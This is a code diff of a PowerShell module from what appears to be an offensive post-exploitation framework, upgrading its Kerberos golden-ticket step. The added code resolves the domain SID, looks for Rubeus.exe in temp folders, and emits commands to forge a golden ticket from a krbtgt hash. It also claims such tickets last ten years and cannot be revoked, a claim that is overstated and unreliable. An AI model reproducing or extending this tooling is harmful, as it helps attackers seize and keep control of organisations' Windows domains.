@@ -108,21 +108,34 @@ try {{
     $results += "[*] Domain: $domain"
     $results += "[*] User: $targetUser"
 
-    $results += '[*] Golden Ticket requires:'
-    $results += '    1. krbtgt account hash (from domain controller)'
-    $results += '    2. Kerberos ticket encryption library'
-    $results += '    3. Valid SIDs for groups'
+    # Resolve domain SID
+    try {
+        $sidObj = New-Object System.Security.Principal.NTAccount($domain, 'Domain Admins')
+        $fullSid = $sidObj.Translate([System.Security.Principal.SecurityIdentifier]).Value
+        $domainSID = ($fullSid -split '-')[0..($fullSid.Split('-').Length-2)] -join '-'
+    } catch { $domainSID = '' }
+    $results += "[*] Domain SID: $domainSID"
 
-    $results += '[*] To generate:'
-    $results += '    1. Get krbtgt hash: secretsdump.py'
-    $results += '    2. Use tool: goldenticket.py or Rubeus'
-    $results += '    3. Example: python goldenticket.py -user admin -domain example.com -aesKey <hash>'
+    # Try Rubeus.exe for golden ticket forging + injection
+    $rub = $null
+    foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {
+        if (Test-Path $p) { $rub = $p; break }
+    }
+    if (-not $rub) { $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }
 
-    $results += '[*] Golden ticket benefits:'
-    $results += '    ✓ Valid TGT for any user'
-    $results += '    ✓ Works across domain reboot'
-    $results += '    ✓ No password required'
-    $results += '    ✓ Survives account lockout'
+    if ($rub -and $domainSID) {
+        # Obtain krbtgt hash from reg_save BOF output or secretsdump before calling this
+        $results += "[*] Rubeus.exe: $rub — use golden_ticket plugin with krbtgt_hash to forge TGT"
+        $results += "[+] Run: golden_ticket ticket_type=golden domain=$domain domain_sid=$domainSID"
+    } else {
+        $results += '[-] Rubeus.exe not found or domain SID unknown'
+        $results += '[*] Upload Rubeus.exe then use the golden_ticket plugin'
+    }
+
+    $results += '[*] Golden ticket properties:'
+    $results += '    ✓ Valid TGT for any user for 10 years'
+    $results += '    ✓ Survives domain reboot and account lockout'
+    $results += '    ✓ Cannot be revoked by DC once forged and cached'
 
 }} catch {{
     $results += "[!] Golden Ticket error: $_"
